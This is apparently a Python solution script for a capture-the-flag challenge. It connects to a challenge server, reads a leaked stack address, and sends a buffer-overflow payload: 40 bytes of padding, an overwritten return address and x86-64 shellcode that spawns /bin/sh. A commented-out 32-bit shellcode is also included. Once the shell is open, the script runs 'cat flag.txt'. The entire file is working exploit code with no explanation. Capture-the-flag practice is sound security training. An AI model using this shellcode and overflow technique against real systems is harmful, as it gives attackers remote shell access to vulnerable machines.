import socket
from struct import pack

# Define the host and port of the server you want to connect to
HOST = 'chal.sigpwny.com'
PORT = 1377

# Connect to the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    
   # Receive feedback from the server
    data = s.recv(1024)
    feedback = data.decode()
    print("Feedback from server: ", feedback)

    ret_addr2 = int(feedback[-10:-2],16)
    ret_addr1 = int(feedback[-14:-10],16)

    print(hex(ret_addr1))
    print(hex(ret_addr2))

    ret_addr2 = pack("<I", ret_addr2 + 48)
    ret_addr1 = pack("<I", ret_addr1)

	# Shellcode & return address
    # shellcode32 = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80\x00"
    
    shellcode64 = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

    # Run your Python code and save the output to a variable
    payload = b"A"*40 + ret_addr2 + ret_addr1 + shellcode64 + b"\x00"
    
    # Send the output to the server
    s.sendall(payload)
	
    ret = "\n"

    s.sendall(ret.encode())

    # Receive feedback from the server
    data = s.recv(1024)
    print(data)
    # data = data.decode()
    print("Feedback from server: ", data)

	# Command to cat flag.txt
    cmd = "cat flag.txt\n"

    s.sendall(cmd.encode())

    # Receive feedback from the server
    data = s.recv(1024)
    feedback = data.decode()
    print("Feedback from server: ", feedback)

